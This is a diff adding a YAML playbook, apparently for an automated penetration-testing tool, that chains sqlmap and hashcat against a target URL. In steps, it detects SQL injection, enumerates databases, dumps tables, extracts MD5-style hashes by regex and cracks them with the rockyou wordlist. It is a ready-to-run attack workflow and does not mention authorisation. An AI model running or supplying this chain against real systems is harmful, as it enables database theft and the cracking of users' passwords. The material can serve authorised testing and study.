@@ -1,0 +1,75 @@
+name: "SQL Injection Exploitation Chain"
+description: "Detect SQLi with sqlmap, enumerate databases, extract data, then crack leaked hashes. Exploit chaining: SQLi → data exfil → hash cracking."
+category: web
+attack_vector: "SQL injection → data exfiltration → credential cracking"
+variables:
+  url:
+    required: true
+    description: "Target URL with parameter (e.g. http://host/page?id=1)"
+  level:
+    required: false
+    default: 3
+    description: "SQLi test level (1-5)"
+  risk:
+    required: false
+    default: 2
+    description: "Risk level (1-3)"
+cutting_edge: true
+references: ["OWASP SQL Injection", "sqlmap wiki"]
+
+steps:
+  - name: "sqli_detect"
+    tool: "sqlmap_scan"
+    description: "Detect SQL injection vulnerability"
+    args:
+      url: "{{url}}"
+      level: "{{level}}"
+      risk: "{{risk}}"
+      batch: true
+    expected_output: "is vulnerable|parameter .* is vulnerable"
+    timeout: 900
+    gate: true
+    retries: 2
+
+  - name: "db_enum"
+    tool: "sqlmap_scan"
+    description: "Enumerate databases on the target"
+    args:
+      url: "{{url}}"
+      dbs: true
+      batch: true
+    expected_output: "available databases|\\[\\*\\]"
+    timeout: 600
+    gate: true
+    retries: 2
+    extracts:
+      - var: "database"
+        regex: "\\*\\] ([\\w]+)"
+
+  - name: "dump_tables"
+    tool: "sqlmap_scan"
+    description: "Dump data from the target database"
+    args:
+      url: "{{url}}"
+      batch: true
+      dump: true
+    expected_output: null
+    timeout: 900
+    gate: false
+    retries: 1
+    extracts:
+      - var: "hashes"
+        regex: "([a-fA-F0-9]{32})"
+
+  - name: "hash_crack"
+    tool: "hashcat_crack"
+    description: "Crack extracted hashes with hashcat"
+    args:
+      hash_file: "output/sqli_dump.stdout.txt"
+      wordlist: "/usr/share/wordlists/rockyou.txt"
+      mode: 0
+      attack_mode: 0
+    expected_output: null
+    timeout: 3600
+    gate: false
+    retries: 0
